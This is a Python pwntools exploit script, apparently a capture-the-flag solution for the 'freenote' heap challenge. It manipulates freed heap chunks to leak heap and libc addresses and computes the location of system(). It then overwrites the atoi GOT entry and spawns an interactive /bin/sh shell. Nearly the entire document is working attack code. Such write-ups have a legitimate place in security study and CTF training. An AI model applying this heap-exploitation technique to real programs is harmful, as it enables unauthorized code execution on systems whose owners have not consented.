#!/usr/bin/env python
import pwn
import re

p = pwn.process(['./freenote'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

latobinbase = -0x1a70
latoow = -0x17a0
latorepair = -0x1820
atoitostdout = 0x188020
atoitostdin = 0x1872c0
atoitosys = 0xc480

def list_note():
    p.recvuntil("choice:")
    p.sendline("1")
    r = p.recvuntil("== 0ops Free Note ==")
    return r

def create_note(length, note, ljchar = "\x00"):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("note:")
    p.sendline(str(length))
    p.recvuntil("note:")
    if len(note) != length:
        note = note.ljust(length, ljchar)
    p.send(note)
    return

def edit_note(number, length, note, ljchar = "\x00"):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("number:")
    p.sendline(str(number))
    p.recvuntil("note:")
    p.sendline(str(length))
    p.recvuntil("note:")
    if len(note) != length:
        note = note.ljust(length, "\x00")
    p.send(note)
    return

def delete_note(number):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("number:")
    p.sendline(str(number))
    return

def quit():
    p.recvuntil("choice:")
    p.sendline("5")
    return


create_note(0x18, "AA")
create_note(0x18, "AA")
create_note(0x18, "XX")     #2
delete_note(0)
delete_note(1)
create_note(0x18, "BB")
delete_note(1)

r = list_note()
r = re.search("0.*", r).group(0)[3:]
la = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)
print "[+] Address on heap: "+hex(la)
binbase = la + latobinbase
ow = la + latoow
repair = la + latorepair

create_note(0x300, "BB")     #1
create_note(0x300, "BB")     #3
create_note(0x300, "BB")     #4
delete_note(1)
delete_note(3)
create_note(0x300, "BB")     #1
delete_note(3)


sen1 = pwn.p64(ow) + pwn.p64(binbase)
edit_note(1, 0x300, sen1)

create_note(0x300, "BB")     
create_note(0x300, pwn.p64(0x602070))     

r = list_note()
r = re.search("4.*", r).group(0)[3:]
atoi = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)

print "[+] atoi is at: "+hex(atoi)
stdout = atoi + atoitostdout
stdin = atoi + atoitostdin
sys = atoi + atoitosys
print "[+] stdout is at: "+hex(stdout)
print "[+] stdin is at: "+hex(stdin)
print "[+] System is at: "+hex(sys)

sen2 = pwn.p64(sys) + pwn.p64(0)
sen2 += pwn.p64(0)*2
sen2 += pwn.p64(stdout) + pwn.p64(stdin)
sen2 += pwn.p64(0) + pwn.p64(repair)

edit_note(4, 0x300, sen2)

p.sendline("/bin/sh\x00")

print "[+] Shell spawned."

p.recvuntil("choice:")
p.interactive()
